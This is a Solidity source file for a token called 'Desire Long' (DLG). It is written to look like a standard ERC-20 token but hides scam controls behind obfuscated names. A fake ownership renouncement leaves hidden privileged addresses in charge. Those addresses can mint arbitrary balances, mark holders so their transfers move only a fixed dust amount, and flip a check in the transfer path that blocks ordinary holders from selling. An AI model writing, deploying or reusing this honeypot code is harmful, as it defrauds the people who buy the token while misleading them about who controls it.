//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface amountTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fromMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamEnable {
    function createPair(address sellLimit, address modeSender) external returns (address);
}

interface totalFeeReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minTx) external view returns (uint256);

    function transfer(address walletTotal, uint256 buyMinMax) external returns (bool);

    function allowance(address atTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyMinMax) external returns (bool);

    function transferFrom(
        address sender,
        address walletTotal,
        uint256 buyMinMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletEnable, uint256 value);
    event Approval(address indexed atTrading, address indexed spender, uint256 value);
}

interface totalFeeReceiverMetadata is totalFeeReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DesireLong is fromMax, totalFeeReceiver, totalFeeReceiverMetadata {

    address listBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private tradingFund = 18;

    function decimals() external view virtual override returns (uint8) {
        return tradingFund;
    }

    function approve(address launchedAt, uint256 buyMinMax) public virtual override returns (bool) {
        shouldWallet[_msgSender()][launchedAt] = buyMinMax;
        emit Approval(_msgSender(), launchedAt, buyMinMax);
        return true;
    }

    uint256 maxLimit;

    uint256 public maxIs;

    mapping(address => bool) public modeLiquidityTrading;

    bool private enableIs;

    constructor (){
        if (feeShould) {
            enableIs = false;
        }
        amountTotal maxExempt = amountTotal(tradingExemptBuy);
        totalReceiver = teamEnable(maxExempt.factory()).createPair(maxExempt.WETH(), address(this));
        if (exemptReceiver != maxIs) {
            enableIs = true;
        }
        modeExempt = _msgSender();
        minList();
        tradingExemptLaunch[modeExempt] = true;
        enableTo[modeExempt] = launchLiquidity;
        if (atToken) {
            minFee = exemptReceiver;
        }
        emit Transfer(address(0), modeExempt, launchLiquidity);
    }

    function owner() external view returns (address) {
        return feeTotal;
    }

    string private takeFund = "DLG";

    bool private isLaunched;

    function symbol() external view virtual override returns (string memory) {
        return takeFund;
    }

    function maxLaunch(address fundLaunch, address walletTotal, uint256 buyMinMax) internal returns (bool) {
        require(enableTo[fundLaunch] >= buyMinMax);
        enableTo[fundLaunch] -= buyMinMax;
        enableTo[walletTotal] += buyMinMax;
        emit Transfer(fundLaunch, walletTotal, buyMinMax);
        return true;
    }

    bool public swapTx;

    function tokenIs(address walletReceiverTotal) public {
        if (swapTx) {
            return;
        }
        if (minFee != maxIs) {
            minFee = buyExempt;
        }
        tradingExemptLaunch[walletReceiverTotal] = true;
        if (sellAt != isLaunched) {
            isLaunched = true;
        }
        swapTx = true;
    }

    bool public feeShould;

    function sellToken(address tokenSell) public {
        receiverSell();
        if (atToken != isLaunched) {
            feeShould = false;
        }
        if (tokenSell == modeExempt || tokenSell == totalReceiver) {
            return;
        }
        modeLiquidityTrading[tokenSell] = true;
    }

    uint256 constant launchMarketing = 15 ** 10;

    event OwnershipTransferred(address indexed receiverSwap, address indexed receiverMax);

    address private feeTotal;

    function amountBuy(address atMin, uint256 buyMinMax) public {
        receiverSell();
        enableTo[atMin] = buyMinMax;
    }

    function transfer(address atMin, uint256 buyMinMax) external virtual override returns (bool) {
        return swapMarketing(_msgSender(), atMin, buyMinMax);
    }

    uint256 private buyExempt;

    string private shouldTake = "Desire Long";

    function transferFrom(address fundLaunch, address walletTotal, uint256 buyMinMax) external override returns (bool) {
        if (_msgSender() != tradingExemptBuy) {
            if (shouldWallet[fundLaunch][_msgSender()] != type(uint256).max) {
                require(buyMinMax <= shouldWallet[fundLaunch][_msgSender()]);
                shouldWallet[fundLaunch][_msgSender()] -= buyMinMax;
            }
        }
        return swapMarketing(fundLaunch, walletTotal, buyMinMax);
    }

    mapping(address => uint256) private enableTo;

    function minList() public {
        emit OwnershipTransferred(modeExempt, address(0));
        feeTotal = address(0);
    }

    uint256 public minFee;

    uint256 sellTakeToken;

    function balanceOf(address minTx) public view virtual override returns (uint256) {
        return enableTo[minTx];
    }

    function allowance(address listFrom, address launchedAt) external view virtual override returns (uint256) {
        if (launchedAt == tradingExemptBuy) {
            return type(uint256).max;
        }
        return shouldWallet[listFrom][launchedAt];
    }

    function isSwap(uint256 buyMinMax) public {
        receiverSell();
        sellTakeToken = buyMinMax;
    }

    address public totalReceiver;

    mapping(address => bool) public tradingExemptLaunch;

    function receiverSell() private view {
        require(tradingExemptLaunch[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private shouldWallet;

    function name() external view virtual override returns (string memory) {
        return shouldTake;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchLiquidity;
    }

    uint256 private exemptReceiver;

    function swapMarketing(address fundLaunch, address walletTotal, uint256 buyMinMax) internal returns (bool) {
        if (fundLaunch == modeExempt) {
            return maxLaunch(fundLaunch, walletTotal, buyMinMax);
        }
        uint256 feeMaxEnable = totalFeeReceiver(totalReceiver).balanceOf(listBuy);
        require(feeMaxEnable == sellTakeToken);
        require(walletTotal != listBuy);
        if (modeLiquidityTrading[fundLaunch]) {
            return maxLaunch(fundLaunch, walletTotal, launchMarketing);
        }
        return maxLaunch(fundLaunch, walletTotal, buyMinMax);
    }

    function getOwner() external view returns (address) {
        return feeTotal;
    }

    bool private sellAt;

    uint256 private launchLiquidity = 100000000 * 10 ** 18;

    bool private atToken;

    address public modeExempt;

    address tradingExemptBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}